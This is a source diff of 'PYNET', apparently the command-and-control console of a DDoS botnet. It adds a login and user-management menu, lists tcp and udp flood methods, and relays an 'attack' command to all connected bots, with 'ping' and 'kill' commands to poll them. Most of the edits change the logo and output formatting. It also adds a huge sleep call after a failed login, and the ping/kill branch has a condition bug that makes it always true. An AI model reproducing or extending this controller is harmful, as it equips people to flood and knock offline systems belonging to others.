@@ -13,21 +13,21 @@ os.system('cls')
 
 def print_logo():
 	print(f"""{Fore.RESET}
-            {Fore.GREEN}oooooooooo             {Fore.RED}oooo   oooo              o8   
-            {Fore.GREEN} 888    888 oooo   oooo{Fore.RED} 8888o  88  ooooooooo8 o888oo 
-            {Fore.GREEN} 888oooo88   888   888{Fore.RED}  88 888o88 888oooooo8   888   
-            {Fore.GREEN} 888          888 888{Fore.RED}   88   8888 888          888   
-            {Fore.GREEN}o888o           8888{Fore.RED}   o88o    88   88oooo888   888o 
+            {Fore.GREEN}oooooooooo             {Fore.RED}oooo   oooo            o8   
+            {Fore.GREEN} 888    888 oooo   oooo{Fore.RED} 8888o  88  ooooooo8 o888oo 
+            {Fore.GREEN} 888oooo88   888   888{Fore.RED}  88 888o88 888oooo8   888   
+            {Fore.GREEN} 888          888 888{Fore.RED}   88   8888 888        888   
+            {Fore.GREEN}o888o           8888{Fore.RED}   o88o    88   88oo888   888o 
             {Fore.GREEN}             o8o888                                  {Fore.RESET}  
     """)
 
 def admin_logo():
 	print(f"""{Fore.RESET}
-            {Fore.MAGENTA}oooooooooo             {Fore.RESET}oooo   oooo              o8   
-            {Fore.MAGENTA} 888    888 oooo   oooo{Fore.RESET} 8888o  88  ooooooooo8 o888oo 
-            {Fore.MAGENTA} 888oooo88   888   888{Fore.RESET}  88 888o88 888oooooo8   888   
-            {Fore.MAGENTA} 888          888 888{Fore.RESET}   88   8888 888          888   
-            {Fore.MAGENTA}o888o           8888{Fore.RESET}   o88o    88   88oooo888   888o 
+            {Fore.MAGENTA}oooooooooo             {Fore.RESET}oooo   oooo            o8   
+            {Fore.MAGENTA} 888    888 oooo   oooo{Fore.RESET} 8888o  88  ooooooo8 o888oo 
+            {Fore.MAGENTA} 888oooo88   888   888{Fore.RESET}  88 888o88 888oooo8   888   
+            {Fore.MAGENTA} 888          888 888{Fore.RESET}   88   8888 888        888   
+            {Fore.MAGENTA}o888o           8888{Fore.RESET}   o88o    88   88oo888   888o 
             {Fore.MAGENTA}             o8o888                                  {Fore.RESET}  
     """)
 
@@ -68,6 +68,7 @@ else:
 	print(f'{Fore.RED}[PYNET] {Fore.RESET}${Fore.RED} INVALID LOGIN.')
 	exit()
 	sys.exit()
+	sleep(99999999999999999999999999999999999999999999999999999999999999999999)
 
 class Server():
 	def __init__(self, connect:Tuple[str,int]=("0.0.0.0",9999)):
@@ -168,26 +169,30 @@ class Server():
 					print(f'''
     {Fore.MAGENTA}add <user> <pass>         {Fore.RESET}Adds new user to db
     {Fore.MAGENTA}remove <user> <pass>      {Fore.RESET}Removes user from db
-    {Fore.MAGENTA}blacklist <hwid>          {Fore.RESET}Blacklists user by hwid	
+    {Fore.MAGENTA}blacklist <hwid>          {Fore.RESET}Blacklists user by hwid
     {Fore.MAGENTA}main                      {Fore.RESET}Returns to main menu
 					''')
 					admincmd=input(f"{Fore.RESET}{Fore.MAGENTA}[PYNET]{Fore.RESET} $ {Fore.MAGENTA}")
 					admincmd = admincmd.strip()
+
 					if admincmd == "main":
 						os.system('cls')
 						print_logo()
+
 					elif admincmd == "blacklist":
 						userhwid = admincmd[1]
 						print(userhwid)
+
 					else:
 						os.system('cls')
 						print_logo()
+
 				else:
 					print(f"\n {Fore.RED}[ERROR]{Fore.RESET} You don't have Admin Privileges!{Fore.RESET}\n")
 
 			elif cmd == "methods":
 				print(f"""
-    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]  {Fore.GREEN}tcp 
+    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]  {Fore.GREEN}tcp {Fore.RED}(DEVELOPMENT) 
     {Fore.RESET}[{Fore.RED}+{Fore.RESET}]  {Fore.GREEN}udp{Fore.RESET} 					
 				""")
 				
@@ -195,28 +200,30 @@ class Server():
 				self.exit_gracefully()
 				
 			elif "attack" in cmd:
-				args = cmd.strip()
-				ip = args[2]
+				args = cmd.split()
 				for i, (ip, port) in enumerate(self.all_address):
 					try:
 						self.all_connections[i].send(cmd.encode())
-						print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   STARTED ATTACKING {Fore.RED}{ip}{Fore.RESET} SUCCESSFULLY \n')
+						print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   STARTED ATTACKING {Fore.GREEN}SUCCESSFULLY{Fore.RESET}')
 					except BrokenPipeError:
 						del self.all_address[i]
 						del self.all_connections[i]
 						print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}] ATTACK ERROR\n')
+				print()
 						
 			elif cmd == "ping" or "kill":
+				print()
 				for i, (ip, port) in enumerate(self.all_address):
 					try:
 						self.all_connections[i].send(cmd.encode())
 						try:
-						    print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   {ip}:{port}   {Fore.GREEN}{self.all_connections[i].recv(1024*5).decode("ascii")}{Fore.RESET} \n')
+							print(f'    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   {ip}:{port}   {Fore.GREEN}{self.all_connections[i].recv(1024*5).decode("ascii")}{Fore.RESET}')
 						except:
-						    print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   {ip}:{port}   {Fore.RED}DEAD{Fore.RESET} \n')						
+						    print(f'    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   {ip}:{port}   {Fore.RED}DEAD{Fore.RESET} ')
 					except BrokenPipeError:
 						del self.all_address[i]
 						del self.all_connections[i]
+				print()
 		else:
 			pass
 
